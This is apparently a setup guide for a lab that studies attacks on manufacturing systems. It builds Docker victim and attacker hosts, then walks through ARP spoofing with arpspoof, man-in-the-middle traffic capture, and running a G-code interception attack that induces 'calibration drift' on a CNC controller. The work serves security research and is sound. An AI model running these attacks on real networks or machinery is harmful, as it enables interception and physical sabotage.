# Getting Started Guide

## Manufacturing Systems Security Research Framework

This guide will walk you through setting up the complete research environment from scratch.

## Table of Contents

1. [System Requirements](#system-requirements)
2. [Initial Setup](#initial-setup)
3. [Docker Infrastructure](#docker-infrastructure)
4. [Network Configuration](#network-configuration)
5. [Running Your First Experiment](#running-your-first-experiment)
6. [Troubleshooting](#troubleshooting)

---

## System Requirements

### Minimum Requirements
- **CPU**: 2 cores
- **RAM**: 4GB
- **Disk Space**: 10GB free
- **OS**: Linux (Ubuntu 20.04+), macOS 10.15+, or Windows with WSL2

### Recommended Requirements
- **CPU**: 4+ cores
- **RAM**: 8GB+
- **Disk Space**: 20GB+ SSD
- **OS**: Ubuntu 22.04 LTS
- **Network**: Dedicated network interface for testing

### Software Dependencies
- Docker Engine 20.10+
- Docker Compose v2.0+
- Python 3.8 or higher
- Git 2.30+

---

## Initial Setup

### Step 1: Verify Docker Installation

```bash
# Check Docker version
docker --version
# Expected: Docker version 20.10.0 or higher

# Check Docker Compose version
docker compose version
# Expected: Docker Compose version v2.0.0 or higher

# Test Docker functionality
docker run hello-world
```

### Step 2: Clone the Repository

```bash
git clone <repository-url>
cd Doom-and-Gloom
```

### Step 3: Install Python Dependencies

```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install requirements
pip install -r requirements.txt
```

### Step 4: Verify Directory Structure

```bash
# List the directory structure
tree -L 2

# Expected structure:
# Doom-and-Gloom/
# ├── infrastructure/
# ├── scenarios/
# ├── data/
# ├── analysis/
# ├── docs/
# └── scripts/
```

---

## Docker Infrastructure

### Understanding the Network Topology

The research framework uses three Docker containers:

1. **HostA (10.9.0.5)**: Simulates a legitimate network controller or workstation
2. **HostB (10.9.0.6)**: Simulates a CNC machine or target device
3. **HostM (10.9.0.105)**: Attacker/researcher node with monitoring capabilities

### Starting the Infrastructure

```bash
# Navigate to docker directory
cd infrastructure/docker

# Start all containers
docker compose up -d

# Verify containers are running
docker ps
```

**Expected Output:**
```
CONTAINER ID   IMAGE                              STATUS    PORTS                    NAMES
abc123...      handsonsecurity/seed-ubuntu:large  Up        0.0.0.0:8050->8050/tcp  M-10.9.0.105
def456...      handsonsecurity/seed-ubuntu:large  Up                                B-10.9.0.6
ghi789...      handsonsecurity/seed-ubuntu:large  Up                                A-10.9.0.5
```

### Accessing Containers

```bash
# Access HostA (victim/controller)
docker exec -it A-10.9.0.5 /bin/bash

# Access HostB (victim/CNC machine)
docker exec -it B-10.9.0.6 /bin/bash

# Access HostM (attacker/researcher)
docker exec -it M-10.9.0.105 /bin/bash
```

### Stopping the Infrastructure

```bash
# Stop all containers
docker compose down

# Stop and remove volumes (clean slate)
docker compose down -v
```

---

## Network Configuration

### Step 1: Verify Network Connectivity

From **HostM** container:

```bash
# Ping HostA
ping -c 3 10.9.0.5

# Ping HostB
ping -c 3 10.9.0.6

# View ARP cache
arp -n
```

### Step 2: Enable ARP Poisoning Capabilities

From **HostM** container:

```bash
# Enable IP forwarding (required for MITM)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Expected output: 1

# Install required tools (if not already installed)
apt-get update
apt-get install -y dsniff iptables tcpdump
```

### Step 3: Test ARP Spoofing

```bash
# From HostM, start ARP spoofing
# Target: HostA (10.9.0.5) pretending to be HostB (10.9.0.6)
arpspoof -i eth0 -t 10.9.0.5 10.9.0.6 &

# In another terminal, spoof the reverse direction
arpspoof -i eth0 -t 10.9.0.6 10.9.0.5 &

# Verify ARP poisoning success
# From HostA container:
docker exec -it A-10.9.0.5 arp -n
# The MAC address for 10.9.0.6 should now match HostM's MAC
```

### Step 4: Capture Traffic

```bash
# From HostM, capture traffic between HostA and HostB
tcpdump -i eth0 -w /volumes/capture_test.pcap host 10.9.0.5 or host 10.9.0.6

# Let it run for 30 seconds, then stop with Ctrl+C
# Analyze the capture
tcpdump -r /volumes/capture_test.pcap -n
```

---

## Running Your First Experiment

### Experiment 1: Baseline Network Measurement

This experiment establishes baseline metrics without attacks.

```bash
# From your host machine (not in container)
cd Doom-and-Gloom

# Run baseline measurement script
python3 scripts/run_baseline.py --duration 60 --output data/baseline/baseline_$(date +%Y%m%d_%H%M%S).json
```

### Experiment 2: ARP Poisoning Attack

```bash
# Start the infrastructure
cd infrastructure/docker
docker compose up -d

# Access attacker container
docker exec -it M-10.9.0.105 /bin/bash

# Inside HostM container, run the ARP poisoning attack
cd /volumes
python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6 --duration 120
```

### Experiment 3: G-Code MITM Attack

**Prerequisites**: Physical GRBL controller OR simulated endpoint

```bash
# From host machine
cd Doom-and-Gloom/scenarios/attack_modules

# Configure target in config file
nano cnc_config.json
# Set CNC IP and port (e.g., 192.168.0.170:8080)

# Run G-code interception attack
python3 gcode_mitm_attack.py --attack-type calibration_drift --duration 300
```

### Experiment 4: View Results

```bash
# Generate analysis report
cd Doom-and-Gloom/analysis
python3 generate_report.py --experiment data/archived_experiments/experiment_latest.json

# View dashboard (if available)
python3 dashboard_enhanced.py
# Access at http://localhost:8050
```

---

## Troubleshooting

### Issue: Containers Won't Start

**Symptoms**: `docker compose up -d` fails or containers exit immediately

**Solutions**:
```bash
# Check Docker daemon status
sudo systemctl status docker

# View container logs
docker compose logs

# Remove old containers and try again
docker compose down -v
docker compose up -d
```

### Issue: Cannot Ping Between Containers

**Symptoms**: `ping 10.9.0.5` fails from HostM

**Solutions**:
```bash
# Verify network exists
docker network ls | grep net-10.9.0.0

# Inspect network
docker network inspect net-10.9.0.0

# Restart Docker networking
docker compose down
docker compose up -d
```

### Issue: ARP Poisoning Not Working

**Symptoms**: ARP cache doesn't change on victim hosts

**Solutions**:
```bash
# Verify IP forwarding is enabled
docker exec -it M-10.9.0.105 cat /proc/sys/net/ipv4/ip_forward
# Should output: 1

# Check if arpspoof is running
docker exec -it M-10.9.0.105 ps aux | grep arpspoof

# Verify privileged mode (required for ARP spoofing)
docker inspect M-10.9.0.105 | grep Privileged
# Should show: "Privileged": true
```

### Issue: Python Dependencies Not Found

**Symptoms**: `ModuleNotFoundError` when running scripts

**Solutions**:
```bash
# Ensure virtual environment is activated
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate     # Windows

# Reinstall dependencies
pip install --upgrade pip
pip install -r requirements.txt

# Verify installation
pip list
```

### Issue: Port Conflicts

**Symptoms**: `Error: port 8050 already in use`

**Solutions**:
```bash
# Find process using the port
sudo lsof -i :8050
# or on Windows:
# netstat -ano | findstr :8050

# Kill the process or change port in docker-compose.yml
# Edit docker-compose.yml and change port mapping:
# ports:
#   - "8051:8050"  # Changed from 8050:8050
```

### Issue: Permission Denied Errors

**Symptoms**: Cannot write to `/volumes/` directory

**Solutions**:
```bash
# Fix volume permissions
sudo chmod -R 777 infrastructure/volumes/

# Or run docker commands with sudo
sudo docker compose up -d
```

---

## Next Steps

After completing the initial setup:

1. ✅ Read the [Architecture Overview](ARCHITECTURE.md) to understand system components
2. ✅ Review [Experiment Guide](EXPERIMENTS.md) for detailed experiment protocols
3. ✅ Explore existing attack scenarios in `scenarios/attack_modules/`
4. ✅ Check out data analysis tools in `analysis/`
5. ✅ Join the research team discussions

## Getting Help

- **Issues**: Open an issue on GitHub
- **Questions**: Contact the research team
- **Documentation**: Check the `docs/` directory
- **Examples**: See `examples/` directory for sample experiments

---

**Document Version**: 1.0.0  
**Last Updated**: November 10, 2025
